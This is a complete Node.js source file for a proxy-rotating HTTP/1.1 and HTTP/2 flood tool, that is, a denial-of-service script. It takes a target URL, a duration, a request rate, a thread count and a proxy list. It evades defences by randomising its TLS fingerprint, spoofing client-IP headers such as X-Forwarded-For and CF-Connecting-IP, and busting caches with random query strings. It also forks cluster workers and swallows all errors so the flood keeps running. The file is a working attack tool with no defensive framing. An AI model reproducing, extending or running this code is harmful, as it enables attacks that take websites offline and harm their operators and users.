const net = require("net");
const tls = require("tls");
const http2 = require("http2");
const http = require("http");
const https = require("https");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const path = require("path");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
  console.log(`node ${path.basename(process.argv[1])} <target> <time> <rps> <threads> <proxyFile>`);
  process.exit(0);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
const rps = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (!target || !duration || !rps || !threads || !proxyFile) {
  console.log("Invalid arguments.");
  process.exit(1);
}

let proxies = [];
try {
  proxies = fs.readFileSync(proxyFile, "utf-8").toString().split(/\r?\n/).filter(Boolean);
} catch (e) {
  console.log("Proxy file not found or empty.");
  process.exit(1);
}
if (proxies.length === 0) {
  console.log("No proxies loaded.");
  process.exit(1);
}

const parsedTarget = url.parse(target.startsWith("http") ? target : "http://" + target);
const targetHost = parsedTarget.hostname;
const targetPort = parsedTarget.port || (parsedTarget.protocol === "https:" ? 443 : 80);
const targetPath = parsedTarget.path || "/";
const targetIsHttps = parsedTarget.protocol === "https:" || targetPort === 443;

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
];

const ciphers = [
  "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:HIGH:!aNULL:!MD5:!RC4",
  "ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:HIGH:!aNULL:!MD5:!RC4",
  "DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:HIGH:!aNULL:!MD5"
];

const sigAlgs = [
  "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
  "ecdsa_secp256r1_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pkcs1_sha384:ecdsa_secp521r1_sha512:rsa_pkcs1_sha512",
  "rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512"
];

const curves = ["prime256v1", "secp384r1", "secp521r1", "X25519"];

const acceptHeaders = [
  "*/*",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
];

const acceptLanguages = [
  "en-US,en;q=0.9",
  "en-GB,en;q=0.8",
  "en-CA,en;q=0.7",
  "en-AU,en;q=0.6",
  "en;q=0.9",
  "fr-FR,fr;q=0.9,en;q=0.8"
];

const acceptEncodings = [
  "gzip, deflate, br",
  "gzip, deflate",
  "br, gzip, deflate",
  "identity",
  "*"
];

const referers = [
  "https://www.google.com/",
  "https://www.bing.com/",
  "https://www.facebook.com/",
  "https://twitter.com/",
  "https://www.youtube.com/",
  "https://www.reddit.com/",
  "https://duckduckgo.com/",
  "https://www.wikipedia.org/",
  "https://www.amazon.com/",
  "https://www.microsoft.com/"
];

const methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"];

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomString(length) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function randomIP() {
  return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 255)}`;
}

function randomPort() {
  return randomInt(1, 65535);
}

function generateHeaders() {
  return {
    "Accept": randomElement(acceptHeaders),
    "Accept-Language": randomElement(acceptLanguages),
    "Accept-Encoding": randomElement(acceptEncodings),
    "Cache-Control": randomInt(0, 1) ? "no-cache" : "max-age=0",
    "Connection": randomInt(0, 1) ? "keep-alive" : "close",
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": randomElement(userAgents),
    "Referer": randomElement(referers) + randomString(5),
    "X-Forwarded-For": randomIP(),
    "X-Real-IP": randomIP(),
    "X-Client-IP": randomIP(),
    "X-Originating-IP": randomIP(),
    "X-Remote-Addr": randomIP(),
    "X-Cluster-Client-IP": randomIP(),
    "True-Client-IP": randomIP(),
    "CF-Connecting-IP": randomIP(),
    "CF-IPCountry": randomString(2).toUpperCase(),
    "X-Country-Code": randomString(2).toUpperCase(),
    "X-Forwarded-Host": randomString(8) + ".com",
    "X-Forwarded-Proto": randomInt(0, 1) ? "http" : "https",
    "X-Host": targetHost,
    "X-Forwarded-Server": randomString(8) + ".com"
  };
}

function generatePath() {
  const basePath = targetPath || "/";
  const query = `?${randomString(8)}=${randomString(8)}&${randomString(5)}=${randomString(5)}`;
  return basePath + query;
}

function parseProxy(proxyStr) {
  const parts = proxyStr.split(":");
  if (parts.length === 2) {
    return { host: parts[0], port: parseInt(parts[1]), username: null, password: null };
  } else if (parts.length === 4) {
    return { host: parts[0], port: parseInt(parts[1]), username: parts[2], password: parts[3] };
  }
  return null;
}

function connectThroughProxy(proxy, targetHost, targetPort, callback) {
  const proxyInfo = parseProxy(proxy);
  if (!proxyInfo) {
    callback(new Error("Invalid proxy format"));
    return;
  }

  const socket = net.connect(proxyInfo.port, proxyInfo.host, () => {
    let connectRequest = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n`;
    if (proxyInfo.username) {
      const auth = Buffer.from(`${proxyInfo.username}:${proxyInfo.password}`).toString("base64");
      connectRequest += `Proxy-Authorization: Basic ${auth}\r\n`;
    }
    connectRequest += "\r\n";
    socket.write(connectRequest);
  });

  let buffer = "";
  let connected = false;

  socket.on("data", (data) => {
    buffer += data.toString();
    if (!connected && buffer.includes("\r\n\r\n")) {
      const headerEnd = buffer.indexOf("\r\n\r\n");
      const responseHeader = buffer.slice(0, headerEnd);
      if (responseHeader.includes("200")) {
        connected = true;
        buffer = buffer.slice(headerEnd + 4);
        callback(null, socket, buffer);
      } else {
        socket.destroy();
        callback(new Error("Proxy connection failed"));
      }
    } else if (connected) {
      callback(null, socket, buffer);
      buffer = "";
    }
  });

  socket.on("error", (err) => {
    if (!connected) {
      callback(err);
    }
  });

  socket.on("close", () => {
    if (!connected) {
      callback(new Error("Proxy closed"));
    }
  });
}

function floodHttp2(proxy, callback) {
  connectThroughProxy(proxy, targetHost, targetPort, (err, socket, initialData) => {
    if (err) {
      callback(err);
      return;
    }

    const tlsOptions = {
      socket: socket,
      host: targetHost,
      servername: targetHost,
      rejectUnauthorized: false,
      ALPNProtocols: ["h2"],
      ciphers: randomElement(ciphers),
      sigalgs: randomElement(sigAlgs),
      ecdhCurve: randomElement(curves),
      secureProtocol: "TLS_method",
      session: false,
      minVersion: "TLSv1.2",
      maxVersion: "TLSv1.3"
    };

    const tlsSocket = tls.connect(tlsOptions, () => {
      const session = http2.connect(`https://${targetHost}:${targetPort}`, {
        createConnection: () => tlsSocket,
        settings: {
          headerTableSize: 65536,
          maxConcurrentStreams: 10000,
          initialWindowSize: 6291456,
          maxHeaderListSize: 65536,
          enablePush: false
        }
      });

      session.on("error", () => {
        session.destroy();
      });

      session.on("close", () => {
        tlsSocket.destroy();
        socket.destroy();
      });

      let activeStreams = 0;
      const maxStreams = 1000;
      const requestInterval = setInterval(() => {
        if (activeStreams >= maxStreams) return;
        const headers = generateHeaders();
        headers[":method"] = randomElement(methods);
        headers[":path"] = generatePath();
        headers[":scheme"] = "https";
        headers[":authority"] = `${targetHost}:${targetPort}`;
        headers["origin"] = `https://${targetHost}`;

        const req = session.request(headers);
        activeStreams++;

        req.on("response", (hdrs) => {
          req.close();
          req.destroy();
          activeStreams--;
        });

        req.on("error", () => {
          req.destroy();
          activeStreams--;
        });

        req.end();
      }, randomInt(1, 10));

      tlsSocket.on("close", () => {
        clearInterval(requestInterval);
        session.destroy();
      });

      socket.on("close", () => {
        clearInterval(requestInterval);
        session.destroy();
      });
    });

    tlsSocket.on("error", (e) => {
      socket.destroy();
      callback(e);
    });

    tlsSocket.on("close", () => {
      callback(new Error("TLS closed"));
    });
  });
}

function floodHttp1(proxy, callback) {
  connectThroughProxy(proxy, targetHost, targetPort, (err, socket, initialData) => {
    if (err) {
      callback(err);
      return;
    }

    const options = {
      host: targetHost,
      port: targetPort,
      method: randomElement(methods),
      path: generatePath(),
      headers: generateHeaders(),
      agent: false,
      createConnection: () => socket
    };

    const req = (targetIsHttps ? https : http).request(options, (res) => {
      res.resume();
      res.on("end", () => {
        callback(null);
      });
    });

    req.on("error", (e) => {
      callback(e);
    });

    req.end();
  });
}

function runWorker() {
  const startTime = Date.now();
  const proxyPool = proxies.slice();
  let requestCount = 0;

  function attack() {
    if (Date.now() - startTime >= duration) {
      process.exit(0);
    }

    const proxy = randomElement(proxyPool);
    const useHttp2 = Math.random() < 0.8;

    if (useHttp2) {
      floodHttp2(proxy, (err) => {
        if (!err) requestCount++;
        setImmediate(attack);
      });
    } else {
      floodHttp1(proxy, (err) => {
        if (!err) requestCount++;
        setImmediate(attack);
      });
    }
  }

  for (let i = 0; i < rps; i++) {
    attack();
  }
}

if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) {
    cluster.fork();
  }
  cluster.on("exit", (worker, code, signal) => {
    if (Date.now() < (parseInt(process.argv[3]) * 1000)) {
      cluster.fork();
    }
  });
  setTimeout(() => {
    process.exit(0);
  }, duration + 5000);
} else {
  runWorker();
}
